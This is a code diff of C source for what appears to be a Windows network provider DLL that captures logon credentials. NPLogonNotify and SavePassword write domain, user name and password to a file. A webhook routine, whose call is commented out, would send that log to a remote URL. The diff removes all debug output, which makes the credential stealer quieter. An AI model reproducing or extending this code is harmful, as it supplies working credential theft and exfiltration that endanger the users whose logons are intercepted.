@@ -132,40 +132,34 @@ LPWSTR LPWSTRToBase64UTF8(LPWSTR input)
 BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
     int utf8MsgLen = WideCharToMultiByte(CP_UTF8, 0, message, -1, NULL, 0, NULL, NULL);
     if (utf8MsgLen <= 0) {
-        OutputDebugStringW(L"[Webhook] Error al calcular longitud UTF-8\n");
         return FALSE;
     }
 
     char* utf8Msg = (char*)malloc((size_t)utf8MsgLen);
     if (!utf8Msg) {
-        OutputDebugStringW(L"[Webhook] Error al asignar memoria para UTF-8\n");
         return FALSE;
     }
 
     if (WideCharToMultiByte(CP_UTF8, 0, message, -1, utf8Msg, utf8MsgLen, NULL, NULL) == 0) {
         free(utf8Msg);
-        OutputDebugStringW(L"[Webhook] Error al convertir a UTF-8\n");
         return FALSE;
     }
 
     int jsonLen = snprintf(NULL, 0, "{\"message\":\"%s\"}", utf8Msg) + 1;
     if (jsonLen <= 0) {
         free(utf8Msg);
-        OutputDebugStringW(L"[Webhook] Error al formatear JSON\n");
         return FALSE;
     }
 
     char* jsonData = (char*)malloc((size_t)jsonLen);
     if (!jsonData) {
         free(utf8Msg);
-        OutputDebugStringW(L"[Webhook] Error al asignar memoria para JSON\n");
         return FALSE;
     }
 
     if (sprintf_s(jsonData, (size_t)jsonLen, "{\"text\":\"%s\"}", utf8Msg) < 0) {
         free(utf8Msg);
         free(jsonData);
-        OutputDebugStringW(L"[Webhook] Error al generar JSON\n");
         return FALSE;
     }
     free(utf8Msg);
@@ -173,7 +167,6 @@ BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
     HINTERNET hInternet = InternetOpenW(L"WebhookSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
         free(jsonData);
-        OutputDebugStringW(L"[Webhook] Error en InternetOpenW\n");
         return FALSE;
     }
 
@@ -189,7 +182,6 @@ BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
     if (!InternetCrackUrlW(webhookUrl, 0, 0, &urlComp)) {
         free(jsonData);
         InternetCloseHandle(hInternet);
-        OutputDebugStringW(L"[Webhook] Error en InternetCrackUrlW\n");
         return FALSE;
     }
 
@@ -200,7 +192,6 @@ BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
     if (!hConnect) {
         free(jsonData);
         InternetCloseHandle(hInternet);
-        OutputDebugStringW(L"[Webhook] Error en InternetConnectW\n");
         return FALSE;
     }
 
@@ -214,14 +205,14 @@ BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
         free(jsonData);
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
-        OutputDebugStringW(L"[Webhook] Error en HttpOpenRequestW\n");
         return FALSE;
     }
 
     LPCWSTR headers = L"Content-Type: application/json\r\n";
-    if (!HttpAddRequestHeadersW(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE)) {
-        OutputDebugStringW(L"[Webhook] Error al agregar cabeceras\n");
-    }
+    HttpAddRequestHeadersW(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
+    // if (!HttpAddRequestHeadersW(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE)) {
+    //    OutputDebugStringW(L"[Webhook] Error al agregar cabeceras\n");
+    // }
 
     BOOL result = HttpSendRequestW(hRequest, NULL, 0, jsonData, (DWORD)strlen(jsonData));
     free(jsonData);
@@ -231,11 +222,11 @@ BOOL SendWebhookJSON(LPCWSTR webhookUrl, LPWSTR message) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 
-    if (!result) {
-        OutputDebugStringW(L"[Webhook] Error en HttpSendRequestW\n");
-    } else {
-        OutputDebugStringW(L"[Webhook] Solicitud enviada con exito\n");
-    }
+    // if (!result) {
+    //     OutputDebugStringW(L"[Webhook] Error en HttpSendRequestW\n");
+    // } else {
+    //     OutputDebugStringW(L"[Webhook] Solicitud enviada con exito\n");
+    // }
 
     return result;
 }
@@ -265,6 +256,7 @@ void SavePassword(PWCHAR operation, PUNICODE_STRING domain, PUNICODE_STRING user
         WriteFile(hFile, logString, (DWORD)wcslen(logString) * sizeof(WCHAR), &dwWritten, NULL);
         CloseHandle(hFile);
     }
+    
     // LPCWSTR webhookUrl = L"";
     // SendWebhookJSON(webhookUrl, logString);
 }
@@ -316,6 +308,7 @@ NPLogonNotify(
 	lpLogonScript = NULL;
 	return WN_SUCCESS;
 }
+
 
 __declspec(dllexport)
 DWORD
